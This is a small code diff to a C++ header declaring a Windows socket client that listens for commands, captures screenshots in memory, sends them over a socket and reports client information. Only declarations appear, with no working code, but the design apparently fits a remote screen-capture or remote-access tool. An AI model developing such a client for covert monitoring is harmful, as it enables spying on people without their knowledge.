@@ -1,6 +1,7 @@
 #pragma once
 
 #include <string>
+#include <vector>
 #include <winsock2.h>
 
 class Client {
@@ -17,7 +18,7 @@ public:
 
 private:
     void listenForCommands() const;
-    static void captureScreenshot(const std::string& filePath);
+    static std::vector<BYTE> captureScreenshot();
     static void sendScreenshot(SOCKET sock);
     void sendClientInfo() const;  
 };
